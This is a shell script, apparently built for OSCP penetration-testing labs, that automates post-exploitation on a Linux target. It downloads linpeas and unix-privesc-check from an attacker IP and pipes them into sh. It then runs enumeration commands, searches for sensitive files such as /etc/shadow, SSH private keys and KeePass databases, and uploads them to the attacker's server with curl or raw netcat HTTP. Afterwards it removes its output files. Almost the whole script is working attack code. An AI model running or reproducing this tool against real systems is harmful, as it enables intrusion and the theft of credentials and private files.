#!/bin/sh

# =============================================================================
# SLAMIT - System Enumeration and File Exfiltration Tool
# =============================================================================
# 
# This script performs comprehensive system enumeration and uploads interesting
# files to a web server. It includes:
# - Automatic enumeration (linpeas, unix-privesc-check)
# - Manual enumeration commands
# - File discovery and upload
# 
# NOTE: custom_upload.sh is commented out to prevent duplicate file uploads
# since this script already handles file searching and uploading.
# 
# =============================================================================

# Configuration

CMD_OUTPUT=""
EXFIL_LOCATION="/tmp/slamit" # MUST BE A WRITEABLE LOCATION ON TARGET
OUTPUT_FILE="$EXFIL_LOCATION/slamit-sh-out.txt"
OUTPUT_LINPEAS="$EXFIL_LOCATION/linpeas-out.txt"
OUTPUT_UNIX_PRIVESC="$EXFIL_LOCATION/unix-privesc-check-out.txt"
URI="192.168.45.216"
PORT=80
URL="http://$URI:$PORT";        # Replace with your endpoint URL
BASE_DIRECTORY="/home/kali/projects/oscp";
MAIN_DIRECTORY="challenges";
PROJECT_DIRECTORY="oscp_b";
# HOSTNAME=$(hostname);
HOSTNAME="Berlin"
TARGET_FOLDER="$BASE_DIRECTORY/$MAIN_DIRECTORY/$PROJECT_DIRECTORY/$HOSTNAME"
BOUNDARY="----BOUNDARY-$$"
DIVIDER="================================================================"
SYSTEM_HAS_CURL=1

echo "\n\n\n";
cat <<'EOF'
 .----------------.  .----------------.  .----------------.  .----------------.  .----------------.  .----------------. 
| .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. |
| |    _______   | || |   _____      | || |      __      | || | ____    ____ | || |     _____    | || |  _________   | |
| |   /  ___  |  | || |  |_   _|     | || |     /  \     | || ||_   \  /   _|| || |    |_   _|   | || | |  _   _  |  | |
| |  |  (__ \_|  | || |    | |       | || |    / /\ \    | || |  |   \/   |  | || |      | |     | || | |_/ | | \_|  | |
| |   '.___`-.   | || |    | |   _   | || |   / ____ \   | || |  | |\  /| |  | || |      | |     | || |     | |      | |
| |  |`\____) |  | || |   _| |__/ |  | || | _/ /    \ \_ | || | _| |_\/_| |_ | || |     _| |_    | || |    _| |_     | |
| |  |_______.'  | || |  |________|  | || ||____|  |____|| || ||_____||_____|| || |    |_____|   | || |   |_____|    | |
| |              | || |              | || |              | || |              | || |              | || |              | |
| '--------------' || '--------------' || '--------------' || '--------------' || '--------------' || '--------------' |
 '----------------'  '----------------'  '----------------'  '----------------'  '----------------'  '----------------' 
            ....................................................................................................
            ....................................................................................................
            ..............................................%%+***#%..............................................
            ............................................##%%....#%+%............................................
            ............................................%*%......%*%............................................
            .............................................%+@....@%%*............................................
            .............................................%+%....%+%.............................................
            ..............................................%*%..%+%..............................................
            ...............................................%%%%%%...............................................
            ..............................................%*+***+%..............................................
            ..............................................%+***+*%..............................................
            ..............................................%%%%%%%%..............................................
            ..............................................%***+++%..............................................
            ..............................................%***++*%..............................................
            ..............................................%%%%%%%%..............................................
            ..............................................%+++*++%..............................................
            ..............................................%*+****%..............................................
            ................................%.............%%%%%%%%..............................................
            .................................%.....:......%****++%.......%......................................
            ..................................%....@......%+*****%......%......#................................
            ...................................%....%.....%%%%%%*%......%.....%.................................
            ..............................................%*+****%...........%..................................
            ..............................................%******%....................-%........................
            ..........................%...................%*+****%...................%..........................
            ............................%...%%%########***++============+++*#%%%...%............................
            ...............................%-=%=========-=============-====--%=-@...............................
            ...............................%-=%======-==-=-==================%=-@...............................
            .....................%%........%==%===--========================-%-=%........@@.....................
            ...............................%==%======-=====-=================%==%....@%+........................
            ...............................%==%================--======-=====%==%...............................
            ...............................%==%==============================%==%...............................
            ....................#@:........%=-%=========-=====%%=============%==%........*%.....................
            ......................+%:-:=+--%-=%=====-==%%=====%%====-+%======%==%--@%---%+......................
            ........................%%%-----:%%%%%%%%%%%%*%@@%--%%%%%-%%%%%%%%%-------%#@.......................
            ........................%##%%%--------------%--%%%--%#%--%-------------%%###@.......................
            ........................%##%---%%:------%%*:%--------:---%--=%------%%--:###@.......................
            .......................:###%----@%:------%-----%----:-------%=----%-----:###@.......................
            ..................%%%:.-###%--%@---------------%%:-:%:-------------:%@--:###@.......................
            .......................:###%%-----------%%@----%#%%%%--:%%:------------%%###@.......................
            ........................#%#%@@%%%%%%%:----:%##%%#%#%%%##%-----%%%%%%%%%%%%%#@.......................
            ........................###%--------%-----:%#####%%%###%%------%--------=###@.......................
            ........................###@-------%----%%%%%%##%#%#%%%%%%%@----%-------:###@.......................
            ........................###@------%--%%------%%%##%###%------@%--%-------%##@.......................
            ........................###@-----%%---------%%%-:%%%@%%@--------@%%------%##@.......................
            ........................###@%@%------------%------%-----%#---------------%##@.......................
            ........................###@%%----------+%--------%-------%--------------%##@.......................
            ........................###@------------%------------------%-------------%##@.......................
            .......................:###%#%%%%%%@%%%@@@@@@@@@@%%%%@@%@%@@%%%%%%%%@@@@%%##@.......................
            .......................=####################################################@.......................
            ........................%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%........................
            .............................................%#########*............................................
            .............................................%##########............................................
            .....................................%#########################.....................................
            ......................................::::::::::::::::::::::::......................................
EOF
echo "\n\n\n";

printSectionTitle() 
{
    # Header box follows here
    HEADER_NAME="$1";
    WIDTH=90;
    BORDER_CHAR="#";
    PADDING_CHAR=" ";

    # Top border
    printf '%*s\n' "$WIDTH" '' | tr ' ' "$BORDER_CHAR";

    # Empty line
    printf "%s%*s%*s%s\n" "$BORDER_CHAR" \
        $(( (WIDTH - 2) / 2 )) "" \
        $(( WIDTH - 2 - ( (WIDTH - 2) / 2) )) "" \
        "$BORDER_CHAR";

    # Centered header
    INNER_WIDTH=$((WIDTH - 2));
    TEXT_LEN=${#HEADER_NAME};
    LEFT_PAD=$(( (INNER_WIDTH - TEXT_LEN) / 2 ));
    RIGHT_PAD=$(( INNER_WIDTH - TEXT_LEN - LEFT_PAD ));

    printf "%s%*s%s%*s%s\n" "$BORDER_CHAR" \
        "$LEFT_PAD" "" \
        "$HEADER_NAME" \
        "$RIGHT_PAD" "" \
        "$BORDER_CHAR";

    # Empty line
    printf "%s%*s%*s%s\n" "$BORDER_CHAR" \
        $(( (WIDTH - 2) / 2 )) "" \
        $(( WIDTH - 2 - ( (WIDTH - 2) / 2) )) "" \
        "$BORDER_CHAR";

    # Bottom border
    printf '%*s\n' "$WIDTH" '' | tr ' ' "$BORDER_CHAR";
    printf "\n\n";
}

# Determine which program can be used to perform web requests,
# preferring curl.
if command -v curl >/dev/null 2>&1; then
    REQUEST_CMD="curl";
elif command -v wget >/dev/null 2>&1; then
    REQUEST_CMD="wget -qO-";
    SYSTEM_HAS_CURL=0;
else
    echo "Error: Neither curl nor wget is installed." >&2;
    exit 1;
fi

printSectionTitle "Automatic Enumeration"

(
  { $REQUEST_CMD "$URL/linpeas.sh"; echo "exit 0"; } | sh
) >> "$OUTPUT_LINPEAS" 2>&1

(
  { $REQUEST_CMD "$URL/unix-privesc-check"; echo "exit 0"; } | sh -s "detailed"
) >> "$OUTPUT_UNIX_PRIVESC" 2>&1

echo "Automatic enumeration complete. Output written to:"
echo "  - $OUTPUT_LINPEAS"
echo "  - $OUTPUT_UNIX_PRIVESC"
echo ""

# $REQUEST_CMD "$URL/custom_upload.sh";
# NOTE: custom_upload.sh is commented out to prevent duplicate file uploads
# since slamit.sh already handles file searching and uploading below


# ($REQUEST_CMD "$URL/linpeas.sh"; exit 0 | sh) >> "$OUTPUT_LINPEAS" 2>&1 &
# ($REQUEST_CMD "$URL/unix-privesc-check" | sh -s "detailed") >> "$OUTPUT_UNIX_PRIVESC" 2>&1 &

printSectionTitle "Manual Enumeration"

printSectionTitle "Manual Enumeration" >> "$OUTPUT_FILE";

# Loop through each full command line
# Feel free to add whatever you want in here! :D
while IFS= read -r CMD; do
    [ -z "$CMD" ] && continue  # Skip empty lines
    {
        echo "$DIVIDER"
        echo "COMMAND: $CMD"
        echo "$DIVIDER"
        echo
        sh -c "$CMD" 2>&1
        echo
    } >> "$OUTPUT_FILE"
done <<EOF
whoami
id
cat /etc/passwd
hostname
cat /etc/issue
cat /etc/os-release
uname -a
ps aux
ip a
ifconfig
route
routel
netstat -antup
ss -anp
ls -Flagh /etc/iptables
cat /etc/iptables/rules.v4
ls -lah /etc/cron*
crontab -l
dpkg -l
find / -writable -type d 2>/dev/null
find / -writable -type f 2>/dev/null
cat /etc/fstab
mount
lsblk
lsmod
find / -perm -u=s -type f 2>/dev/null
env
cat ~/.bashrc
grep "CRON" /var/log/syslog
EOF

# sudo -l
# sudo crontab -l

echo "Manual enumeration complete. Output written to $OUTPUT_FILE.";
echo ""

printSectionTitle "File Discovery and Upload"

# Space-separated list of extensions
EXTENSIONS="pdf txt log pdf zip doc docx xls xlsx ppt pptx csv ini conf cfg env
    yaml yml json xml ps1 bat cmd sh kdbx rdp 7z rar tar gz bak old tmp db sqlite
    sqlite3 mdb accdb rtf md";
SPECIFIC_FILES="proof.txt local.txt id_rsa id_ecdsa \.git* /etc/passwd /etc/shadow";

# MODIFY THIS to search in different directories.
DIRECTORIES="$HOME /home /var/log";

# Start building the find command
FIND_CMD="find";

# Add directories
for DIR in $DIRECTORIES; do
    FIND_CMD="$FIND_CMD $DIR";
done

# Build the find command dynamically
FIND_CMD="$FIND_CMD -type f ! -name linpeas.sh -readable \\(";
FIRST=1;
for EXT in $EXTENSIONS; do
    if [ "$FIRST" -eq 1 ]; then
        FIND_CMD="$FIND_CMD -iname '*.$EXT'";
        FIRST=0;
    else
        FIND_CMD="$FIND_CMD -o -iname '*.$EXT'";
    fi
done

FIND_CMD="$FIND_CMD \\) 2>/dev/null; ";

# Search for specific files throughout the entire machine.
for FILE in $SPECIFIC_FILES; do
    FIND_CMD="$FIND_CMD find / -type f -readable -name \"$FILE\" 2>/dev/null; ";
done

# Include the output files needed.
for FILE in "$OUTPUT_FILE" "$OUTPUT_LINPEAS" "$OUTPUT_UNIX_PRIVESC"; do
    FILENAME=$(basename "$FILE");
    FIND_CMD="$FIND_CMD find \"$EXFIL_LOCATION\" -name \"$FILENAME\" 2>/dev/null; ";
done

echo "Completed FIND_CMD = $FIND_CMD";

# Count total files first and store in a file to avoid subshell issues
TEMP_COUNT_FILE=$(mktemp)
eval "$FIND_CMD" | wc -l > "$TEMP_COUNT_FILE"
TOTAL_FILES=$(cat "$TEMP_COUNT_FILE")
rm -f "$TEMP_COUNT_FILE"

echo "Found $TOTAL_FILES files to upload"

# Initialize counter for uploads
UPLOAD_COUNT=0

echo "Starting upload of $TOTAL_FILES files..."

# Initialize counters
SUCCESS_COUNT=0
FAILED_COUNT=0

# Evaluate the find command and loop through files
eval "$FIND_CMD" | while IFS= read -r FILE; do
    FILENAME=$(basename "$FILE");
    UPLOAD_COUNT=$((UPLOAD_COUNT + 1))

    # Show progress every 10 files or for the last file
    if [ $((UPLOAD_COUNT % 10)) -eq 0 ] || [ $UPLOAD_COUNT -eq $TOTAL_FILES ]; then
        echo "Progress: [$UPLOAD_COUNT/$TOTAL_FILES] files processed"
    fi

    # Upload using curl with multipart form (silent)

    if  [ "$SYSTEM_HAS_CURL" -eq 1 ]; then
        RESPONSE=$(curl -s -w "%{http_code}" -o /dev/null -X POST "$URL" \
            -F "folder=$TARGET_FOLDER" \
            -F "file=@$FILE;filename=$FILENAME" \
            -H "Expect:");
        # Check if upload was successful
        if [ "$RESPONSE" -ge 200 ] && [ "$RESPONSE" -lt 300 ]; then
            SUCCESS_COUNT=$((SUCCESS_COUNT + 1))
        else
            FAILED_COUNT=$((FAILED_COUNT + 1))
        fi
    else
        # Write data to temporary files to be able to handle binary data.
        TMPFILE=$(mktemp);

        # Write the first part (folder field)
        {
        printf -- "--%s\r\n" "$BOUNDARY";
        printf "Content-Disposition: form-data; name=\"folder\"\r\n";
        printf "\r\n";
        printf "%s\r\n" "$TARGET_FOLDER";

        # Write the file headers
        printf -- "--%s\r\n" "$BOUNDARY";
        printf "Content-Disposition: form-data; name=\"file\"; filename=\"%s\"\r\n" "$FILENAME";
        printf "Content-Type: application/octet-stream\r\n";
        printf "\r\n";
        } > "$TMPFILE";

        cat "$FILE" >> "$TMPFILE";

        # Append closing boundary
        printf "\r\n--%s--\r\n" "$BOUNDARY" >> "$TMPFILE";

        # Get accurate content length
        CONTENT_LENGTH=$(wc -c < "$TMPFILE");

        # Send the HTTP request using netcat
        {
        printf "POST / HTTP/1.1\r\n";
        printf "Host: %s:%s\r\n" "$URI" "$PORT";
        printf "Content-Type: multipart/form-data; boundary=%s\r\n" "$BOUNDARY";
        printf "Content-Length: %s\r\n" "$CONTENT_LENGTH";
        printf "Expect:\r\n";
        printf "\r\n";
        cat "$TMPFILE";
        } | nc "$URI" "$PORT" >/dev/null 2>&1;

        # Clean up
        rm -f "$TMPFILE";

        if [ $? -eq 0 ]; then
            SUCCESS_COUNT=$((SUCCESS_COUNT + 1))
        else
            FAILED_COUNT=$((FAILED_COUNT + 1))
        fi
    fi
done;

# Pretty print summary
echo ""
echo "╔══════════════════════════════════════════════════════════════════════════════╗"
echo "║                              UPLOAD SUMMARY                                 ║"
echo "╠══════════════════════════════════════════════════════════════════════════════╣"
echo "║  Total Files Processed: $(printf "%8d" $UPLOAD_COUNT)                                                    ║"
echo "║  Successfully Uploaded: $(printf "%8d" $SUCCESS_COUNT)                                                    ║"
echo "║  Failed Uploads:        $(printf "%8d" $FAILED_COUNT)                                                    ║"
echo "╚══════════════════════════════════════════════════════════════════════════════╝"
echo ""

echo "Upload complete! Total files uploaded: $UPLOAD_COUNT"

# Final completion message
echo ""
printSectionTitle "SLAMIT COMPLETE"
echo "All operations completed successfully!"
echo "Check the output files for enumeration results:"
echo "  - $OUTPUT_FILE"
echo "  - $OUTPUT_LINPEAS" 
echo "  - $OUTPUT_UNIX_PRIVESC"
echo ""

# Tidy up
rm -f $OUTPUT_FILE $OUTPUT_LINPEAS $OUTPUT_UNIX_PRIVESC;
exit 0;